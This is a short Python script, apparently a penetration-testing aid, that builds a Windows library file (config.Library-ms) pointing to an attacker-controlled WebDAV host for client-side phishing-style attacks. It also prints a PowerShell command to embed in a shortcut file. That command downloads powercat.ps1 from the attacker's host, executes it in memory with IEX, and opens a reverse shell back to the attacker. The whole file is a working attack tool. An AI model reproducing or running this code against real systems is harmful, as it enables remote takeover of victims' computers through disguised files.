#! /usr/bin/python

# This script generates a windows library file pointing towards your webdav server.
# This scripts prints reverse shell code to be injected in windows shortcut file.
# Useful for client-side attacks.
# By @gustanini

import argparse

# Create the parser
parser = argparse.ArgumentParser(description="Requires lhost and lport for Windows Library file and reverse shell.")

# Add the arguments
parser.add_argument('-l', '--lhost', type=str, required=True, help='The local host')
parser.add_argument('-p', '--lport', type=int, required=True, help='The local port for reverse shell')

# Parse the arguments
args = parser.parse_args()

# Save the values into variables
lhost = args.lhost
lport = args.lport

# generate windows config.Library-ms using lhost for URL
with open('config.Library-ms', 'w') as f:
    f.write(f'''<?xml version=1.0 encoding=UTF-8?>
<libraryDescription xmlns=http://schemas.microsoft.com/windows/2009/library>
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://{lhost}/</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
'''
    )

# print reverse shell code with lhost and lport
print('File saved to ./config.Library-ms.\n')
print('Inject the following command in location field when creating shortcut file:\n')
print(f'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}:8000/powercat.ps1\'); powercat -c {lhost} -p {lport} -e powershell"')
